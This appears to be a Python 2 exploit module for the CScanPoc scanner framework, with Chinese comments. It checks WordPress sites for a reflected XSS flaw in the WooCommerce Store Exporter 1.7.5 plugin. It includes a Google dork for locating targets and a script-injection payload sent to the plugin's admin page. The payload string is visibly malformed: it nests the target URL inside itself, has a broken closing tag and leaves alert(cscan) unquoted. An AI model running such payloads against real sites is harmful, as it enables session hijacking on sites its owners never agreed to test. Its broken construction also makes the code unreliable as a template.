# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'WordPress_0064' # 平台漏洞编号，留空
    name = 'WordPress WooCommerce Store Exporter 1.7.5 XSS'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-02-28'  # 漏洞公布时间
    desc = '''
        WordPress WooCommerce Store Exporter 1.7.5 XSS
        Google Dork: inurl:"woocommerce-exporter"
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/34424/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Plugin WooCommerce Store Exporter 1.7.5'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'da82fb91-bec5-48d2-bf6f-5d23cd15564f'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/wp/wp-admin/admin.php?page=woo_ce&tab=<script>alert(cscan)</script<{url}/wp/wp-admin/admin.php?page=woo_ce&tab=%3cscript%3ealert(cscan)%3c/script>>'.format(url=self.target)
            url = self.target + payload
            r = requests.get(url)
            if r.status_code == 200 and '<script>alert(cscan)</script>' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
